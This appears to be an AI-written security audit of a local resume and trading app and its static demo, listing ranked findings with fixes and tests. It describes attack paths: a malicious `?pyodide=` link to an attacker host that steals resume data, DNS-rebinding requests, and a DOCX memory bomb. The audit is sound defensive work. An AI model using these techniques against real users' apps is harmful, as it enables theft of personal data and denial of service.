# CHL M1.12 hardening review: privacy-security (2026-10-28)

**Status (2026-10-28, M1.12):** PS1 to PS8, PS11 and PS12 are fixed on `claude/project-thread-hpanpa-harden`, each with failing-first tests in `tests/test_harden.py`. The screen-name limit landed at 100 characters (qa-tdd's contract), not the 80 suggested below. Still open and scheduled for M1.13 or later: PS9 (chat disclosure line and an explicit key check), PS10 (the demo keeps pasted resume text in localStorage) and PS13 (dependency minimums, lock file, pip-audit).

Scope: local app (charlie/server.py, charlie/handlers.py, store, upload parsing, Claude paths) and the static demo (web/static.js, tools/build_demo.py, tools/check_site.py), on a clean worktree of `claude/project-thread-hpanpa` @ cb6cbd1. The review itself was read-only.

Baseline: `CHARLIE_DATA=mock CHARLIE_LLM=off python -m pytest -q` gave 157 passed, 1 skipped (run once, in the worktree).

How each finding was checked: **RUN** means a probe script, a TestClient call, a live uvicorn run or a demo build reproduced it. **READ** means it comes from reading the code only. The probe scripts (origin, validation and deletion; secure_delete; a docx bomb) were throwaway and aren't in git; tests/test_harden.py now covers each one.

## Ranked findings

### CHL-PS1 (P0, blocks going public): `?pyodide=` lets a link load any script into the public demo
- Evidence: `web/static.js:13` has `const base = params.get("pyodide") || "https://cdn.jsdelivr.net/...";` and line 39 runs `loadScript(base + "pyodide.js")`. `tools/build_demo.py:48` only rewrites the default, so the self-hosted build still reads the parameter. RUN: I built with `--pyodide-dir`. The shipped `static.js:13` is `params.get("pyodide") || "pyodide/"`, and `check_site.py --no-cdn` still says "ok". There's no CSP in `index.html`.
- Exploit: someone shares `https://<demo>/?pyodide=https://attacker.example/`. app.js calls `start()` after the first render, so the attacker's `pyodide.js` runs on the demo's origin without a click. It can read `localStorage["charlie:kv:intake"].resume_text`, which holds any real resume a visitor pasted, and send it off. If the demo is served under chaseholroyd.com, the same script also runs on the portfolio's origin.
- Fix: remove the override from shipped builds. build_demo can strip it, or static.js can accept it only when `new URL(v, location.href).origin === location.origin`. Add a meta CSP to the demo's index.html: `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self'; object-src 'none'; base-uri 'none'`. Add the CDN host only in a non-`--no-cdn` build. Have `check_site.py` fail when static.js reads a URL parameter into a script source, or when the CSP meta is missing.
- Standard: OWASP ASVS L2 V5.3 (injection, DOM sinks), V14.4 (CSP); CWE-829.
- Given the demo built with `--pyodide-dir`, When a test loads `index.html?pyodide=https://attacker.example/` in Playwright, Then no request goes to attacker.example and every script src is same-origin. Also: Given the built site, When `check_site.py --no-cdn` runs, Then it fails if `static.js` still has `params.get("pyodide")` or `index.html` has no CSP meta.

### CHL-PS2 (P1): DNS rebinding gets past the Origin check, and any localhost port is trusted
- Evidence: `charlie/server.py:32-37` compares the Origin host to the request's own `Host` header. An attacker controls both under DNS rebinding. GET requests aren't checked at all, and the port is ignored. RUN (TestClient): with `Host: evil.test:8000` and `Origin: http://evil.test:8000`, POST /api/profile, GET /api/profile and DELETE /api/profile?all=true all returned **200**. POST with `Origin: http://localhost:3000` (another local app) returned **200**. A real cross-site Origin returned 403, as intended.
- Exploit: Chase visits a page on evil.test whose DNS then rebinds to 127.0.0.1. The page's script reads `/api/profile`, which has the name, capital, holdings and employer names taken from the resume's evidence, plus `/api/paper`. It can also DELETE everything or overwrite the profile. Separately, any dev server or untrusted page on another localhost port can post or delete.
- Fix: add Starlette `TrustedHostMiddleware(allowed_hosts=["127.0.0.1", "localhost", "[::1]"])` covering every method. In `same_origin_only`, compare the full Origin (scheme, host and port) to the server's own loopback origin, not to the Host header. This also refuses requests if someone runs the server with `--host 0.0.0.0`.
- Standard: ASVS V4.2.2 and V14.5.3 (CSRF and Origin validation); CWE-350 and CWE-346.
- Given the app, When GET /api/profile is sent with `Host: evil.test:8000`, Then the status is 400 or 403. When DELETE /api/profile?all=true is sent with `Host: evil.test:8000` and `Origin: http://evil.test:8000`, Then the status is 403 and the profile is still there. When POST /api/profile is sent with `Origin: http://localhost:3000` to a server on :8000, Then the status is 403.

### CHL-PS3 (P1): a small DOCX bomb uses gigabytes of memory and freezes the server
- Evidence: `charlie/profile.py` `extract_text` hands the bytes straight to `docx.Document` (and `PdfReader`), with no limit on unpacked size, page count or text length. `charlie/server.py:80-107` is `async def` and calls `extract_text` and `build_profile` synchronously. The 8 MB check (line 94) runs only after the whole file has been read. `build_profile` gets the full extracted text; only the stored copy is cut to 50k (`handlers.py:393`). RUN (p3.py): a **0.30 MB** docx unpacks to 102 MB of XML and took **73 s at 2.1 GB peak RSS**. 0.10 MB took 23 s at 721 MB. The 8 MB cap allows roughly 25x the 0.30 MB file, which would run out of memory. pypdf 6.17 limits each stream to 75 MB but has no cap on page count.
- Exploit: Chase uploads a doctored "resume template", or a rebinding page (PS2) posts one. The single event loop blocks, so the whole app stops answering, and the process can be killed for running out of memory.
- Fix: before python-docx runs, open the zip and refuse files with more than 200 members, more than 20 MB total `file_size`, or an unpack ratio over 100:1. For PDFs, cap pages at 30. Stop extracting once the text reaches 100k characters, and cut the text to 50k before `build_profile` and `enrich`. Move parsing off the event loop: make the route a plain `def`, or use `await run_in_threadpool(extract_text, ...)`.
- Standard: ASVS V12.1.1 to V12.1.3 (upload size, compressed files); CWE-409.
- Given a .docx under 1 MB whose XML unpacks to over 20 MB, When it's posted to /api/profile, Then the reply is 413 or 400 within 2 s, and an /api/status request sent at the same time gets an answer. Given a 31-page PDF, Then only 30 pages are read, or the upload is refused.

### CHL-PS4 (P1): "Delete my data" leaves the resume on disk wherever SQLite isn't built with secure_delete
- Evidence: `charlie/store.py:36` connects without `PRAGMA secure_delete`, and `wipe()` (lines 60-65) only runs DELETEs. There's no VACUUM. RUN (p2.py): with `secure_delete=0`, a resume marker **was still in charlie.db after wipe()**, and VACUUM removed it. This sandbox's SQLite 3.45.1 has `SECURE_DELETE` compiled in, so the default case was clean here (p1.py: no marker, name or screen left after DELETE ?all=true). Many builds, including common macOS Pythons, default to 0, so on Chase's machine the toast "All your data is deleted" is likely untrue. Journal mode is `delete`, and no -wal or -journal file was left behind (RUN).
- Fix: in `Store.__init__`, run `PRAGMA secure_delete=ON`. At the end of `wipe()`, run `VACUUM` outside a transaction, and `PRAGMA wal_checkpoint(TRUNCATE)` if WAL is ever enabled. Plain `delete_profile` should also get `secure_delete` (it's set per connection).
- Standard: ASVS V8.3.2 (user data can be removed); GDPR Art. 17 (needs Chase); LINDDUN Disclosure.
- Given a Store whose connection starts with `PRAGMA secure_delete=0` (simulating a stock build), When a resume containing a marker is saved and `wipe()` runs, Then the marker isn't anywhere in the raw db file. Also: Given a new Store, Then `PRAGMA secure_delete` returns 1.

### CHL-PS5 (P1): a profile with capital=nan or inf breaks the app until you delete it (server and demo)
- Evidence: `server.py:86` `capital: float = Form(25000)` accepts nan and inf. `handlers.py:504` does `float(b.get("capital") or 25000)` in the demo, and `parse_holdings` (`handlers.py:229-235`) calls `int(float("9"*400))`. RUN: POST capital=nan returned 500, and **every later GET /api/profile also returned 500** (the bad profile was stored). inf did the same. `holdings="AAPL 999…(400 digits)"` returned 500 (OverflowError). In the demo, the profile is stored with `NaN` and `browser.request` returns `"capital": NaN`, which JS `JSON.parse` rejects (READ), so the demo stays broken until "Reset demo". `capital="abc"` raises a ValueError out of `route()`.
- Fix: in `Api.save_profile`, which both modes share, require `math.isfinite(capital)` and `0 < capital <= 1e9`, and return 422 naming the field. Coerce with `_number` in `route()`. In `parse_holdings`, skip values that aren't finite or are over 1e9.
- Standard: ASVS V5.1.3 and V5.1.4 (input validation).
- Given the server, When /api/profile is posted with capital "nan", "inf", "-1" or "abc", Then the status is 422 and a following GET /api/profile is 200. Given the demo router, When the same bodies are posted, Then the status is 422 and nothing is written to storage. Given holdings "AAPL 9…9" (400 digits), Then the status is 422, or 200 with that holding dropped, never 500.

### CHL-PS6 (P2): uploads are written to /tmp before the size check, with no limit while streaming
- Evidence: Starlette 1.7 `formparsers.py:150` spools any file part over 1 MB to a `SpooledTemporaryFile` on disk, with no maximum file size. `server.py:93-95` checks 8 MB only after `read()` (READ). Text fields are capped at 1 MB by Starlette (RUN: a 1.1 MB resume_text got 400, "Field exceeded maximum size of 1024KB.").
- Failure path: a 2 GB post fills /tmp before the handler runs. A real resume over 1 MB, such as a PDF with images, is written to /tmp briefly. The temp file is unlinked, but its blocks aren't overwritten.
- Fix: middleware that returns 413 when `Content-Length` is over 9 MB (and when there's no length, counts bytes while streaming) on POST /api/profile, before the form is parsed. Raise the spool threshold above 9 MB so a resume never touches disk.
- Standard: ASVS V12.1.1; CWE-400.
- Given POST /api/profile with `Content-Length: 50000000`, Then the reply is 413 before the body is read, and no new file appears in `tempfile.gettempdir()`.

### CHL-PS7 (P2): the database path depends on the current directory, and only the root /data/ is gitignored
- Evidence: `store.py:33` defaults to the relative path `"data/charlie.db"`, and `server.py:22` creates the Store when the module is imported. `.gitignore` covers only `/data/`. RUN: `git check-ignore` shows that `charlie/data/charlie.db` (a tracked package folder) and `tests/data/charlie.db` are **not ignored**. `CHARLIE_CACHE` (`market.py:38`) has the same problem.
- Failure path: running or importing from `charlie/` or `tests/` creates a real resume database inside a tracked folder, and `git add -A` then commits it. That breaks the "assume public" rule.
- Fix: anchor the defaults to the repo root (`Path(__file__).resolve().parents[1] / "data"`). Add `*.db`, `*.db-journal`, `*.db-wal`, `*.db-shm` and `**/data/cache/` to .gitignore. Have the CI privacy check fail if any `*.db` is tracked.
- Standard: CLAUDE.md hard rule (resumes only in the root /data/); ASVS V8.1.
- Given CWD=tests/ and no CHARLIE_DB, When `charlie.store.Store()` is created, Then the db path equals `<repo>/data/charlie.db`. Given the repo, When `git check-ignore charlie/data/x.db` runs, Then the path is ignored.

### CHL-PS8 (P2): the live-data cache survives "delete everything" and shows which industries the resume pointed to
- Evidence: `market.py:47-60` writes `data/cache/{options,history,facts}/<SYMBOL>.json` in live and auto modes, and `Store.wipe()` doesn't touch it (READ). Daily ideas fetch the tickers in the profile, so the file names are effectively the user's circle of competence.
- Fix: DELETE ?all=true also clears `md.cache_dir`, or the cache goes in a temp folder per process. Say so in the delete confirm.
- Standard: LINDDUN Linkability and Identifiability (metadata leak); ASVS V8.3.2.
- Given auto mode with the cache folder seeded with `AAPL.json`, When DELETE /api/profile?all=true runs, Then the cache folder is empty or gone.

### CHL-PS9 (P2): chat sends personal data from the profile to Anthropic without an explicit opt-in, and "key set" isn't enforced
- Evidence: `chat.py:91-95`. The `get_profile` tool gives Claude the domain evidence (`resume mentions HCA Healthcare`, and "AI read: …" lines quoting the resume), holdings and capital. `chat.py:148-149` puts capital in the system prompt. The UI only says "Claude is connected" (`app.js:521`). Separately, `llm_available()` (`chat.py:136-139`) is true with `CHARLIE_LLM=on` and no key, so `enrich` can send the resume with no key set. The hard rule says only when a key is set (READ).
- Fix: in server mode with the LLM on, show a fixed line under the chat input: "Your questions and a summary of your profile (sectors, employers named in your resume, holdings, capital) are sent to Anthropic." Or leave evidence out of `get_profile` unless the user ticked `use_ai`. Have `enrich` require `ANTHROPIC_API_KEY` or `ANTHROPIC_AUTH_TOKEN` explicitly. I didn't re-check Anthropic's current commercial terms (no training on API data) live this run; check and cite them before going public.
- Standard: LINDDUN Disclosure and Unawareness; CLAUDE.md resume rule.
- Given `CHARLIE_LLM=on` and no key env, When /api/profile is posted with use_ai=true, Then `anthropic.Anthropic` is never built. Given the LLM is on, When index.html is served, Then the chat panel has the disclosure line.

### CHL-PS10 (P2): the demo keeps the pasted resume in localStorage indefinitely
- Evidence: `handlers.py:393` saves `resume_text` into `intake`. In the demo that goes to `localStorage["charlie:kv:intake"]` (RUN: present after a save). Only "Reset demo" or "Delete my data" clears it, and a shared or library computer keeps it.
- Fix: in static mode, don't store `resume_text`; store `resume_chars` only and re-ask on the next save. Alternatively, keep it in sessionStorage.
- Standard: data minimization (ASVS V8.3.4; LINDDUN Disclosure).
- Given `Api(static=True)` with a dict storage, When a profile with resume_text is saved, Then no stored value contains the resume text.

### CHL-PS11 (P2): no security headers on the local app
- Evidence: there's no `Cache-Control: no-store` on /api/*, so the profile JSON can stay in the browser cache after delete. There's no `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'`, so any site can frame 127.0.0.1:8000 and try to trick a click on "Delete my data". There's also no `X-Content-Type-Options: nosniff` (READ, server.py).
- Fix: one middleware that sets these four headers, plus a CSP of `default-src 'self'`.
- Standard: ASVS V14.4.
- Given GET /api/profile, Then the response has `Cache-Control: no-store`, `X-Frame-Options: DENY` and `X-Content-Type-Options: nosniff`.

### CHL-PS12 (P2): text inputs have no size limits
- Evidence: RUN: a 100 KB screen name saved fine (`ScreenBody.name`). `PaperBody.note`, the chat `messages[].content` and the message count are unbounded. `handlers.py:447` sends the last 20 messages to Claude, so cost isn't capped. The `/api/ideas` cache key uses the raw `count` (`handlers.py:412`) even though the engine clamps it to 1 to 3, so `count=999999` adds new rows to the cache. Pydantic 422s repeat the input back (RUN: chat body echoed). That only reaches the same client, but keep it out of logs.
- Fix: `Field(max_length=...)`: name 80, note 500, message content 4000, at most 40 messages. Clamp `count` before building the cache key.
- Standard: ASVS V5.1.3; CWE-400.
- Given POST /api/screen with a 10,000-character name and save=true, Then the status is 422. Given a chat message of 20,000 characters, Then the status is 422.

### CHL-PS13 (P2): dependency minimums allow known-vulnerable versions, and there's no lockfile
- Evidence: `requirements.txt` sets only minimums (`>=`). `fastapi>=0.110` allows Starlette below 0.40 (CVE-2024-47874, multipart memory DoS) and below 0.47.2 (CVE-2025-54121). `pypdf>=4.0` allows versions from before the 6.x decompression limits (for example CVE-2025-55197, fixed in 6.0.0). `requests>=2.31` allows CVE-2024-35195 (fixed in 2.32.0) and CVE-2024-47081 (fixed in 2.32.4). pytest and httpx are runtime requirements. Actions are pinned by tag (`actions/checkout@v7`), not by SHA. This environment has safe versions installed (fastapi 0.162, starlette 1.7, pypdf 6.17, requests 2.34.2). The CVE numbers are from memory, so confirm them with pip-audit.
- Fix (architect owns this): raise the minimums (`fastapi>=0.116`, `pypdf>=6.1`, `requests>=2.32.4`, `python-docx>=1.2`). Add a hashed lock file (`pip-compile --generate-hashes`) and `pip-audit` in ci.yml. Move pytest and httpx to requirements-dev.txt. Pin Actions by SHA (dependabot keeps them updated).
- Standard: ASVS V14.2.1; studio supply-chain bar.
- Given requirements.txt, When a test parses it, Then each runtime package's minimum is at least the patched version listed above. Given CI, Then a pip-audit step exists and fails on known CVEs.

## Verified with no finding
- **Resume in logs (RUN):** a live uvicorn run that triggered the 500 paths, a bad DOCX, chat and delete-all wrote no resume marker to the log. Access lines show only paths such as `/api/ticker/MSFT` and `?all=true`. There's no `print`, `logging` or `console.*` in `charlie/` or `web/` (READ, grep). Tracebacks show code lines, not local variables. `check-logs` covers only `web` and `spike`; PLAN M1.12 already lists extending it to `charlie/`.
- **API responses:** GET /api/profile returns `resume_chars`, never the text (READ, with existing tests). The profile's evidence strings are short keyword or employer phrases. They come back only to the user's own UI, which I accept.
- **Paper only (READ):** there's no broker, order or Alpaca code. The only outbound calls are `requests.get` to Cboe and SEC (`charlie/data/cboe.py:31`, `sec.py:41`), and the SEC User-Agent comes from env only.
- **Claude opt-in (READ):** `use_ai` is `Form(False)` and unticked by default. `enrich` checks `llm_available()`. The demo never calls Claude (`tests/test_browser.py:190`).
- **Path traversal and injection (READ):** symbols go through `lookup()` before any cache path is built (engine.py:228-239, handlers.py:422). StaticFiles handles `..`. All SQL is parameterized, and `wipe()` uses table names from a constant. The ticker path parameter is checked against the universe.
- **XSS (READ):** `md()` escapes before the markdown replacements, and `esc()` is used wherever text goes into innerHTML.
- **Binding (READ):** there's no `uvicorn.run` in the code, and the README and CLAUDE.md say 127.0.0.1. PS2's TrustedHost fix also covers a run on 0.0.0.0.
- **Static demo URL scan (RUN):** `check_site.py --no-cdn` passes on a self-hosted build. Its blind spot is URLs built at runtime (PS1).
- **Deletion in this sandbox (RUN):** with this SQLite build, no profile, name or screen bytes were left after DELETE ?all=true, and no -journal or -wal file was left.

## Gate note (M1.12)
- Open: P0 1 (PS1, blocks the public demo), P1 4 (PS2 to PS5), P2 8.
- Required now: PS1 to PS5, plus PS7 (the "resumes only in root /data" rule).
- Scheduled for M1.13 or later, with a date set by staff-pm: PS6, PS8 to PS13.
- Safe to ship to the next people? **No for the public demo** until PS1 is fixed. The local app is fine for Chase alone, but PS2 and PS4 should land before he relies on "Delete my data".
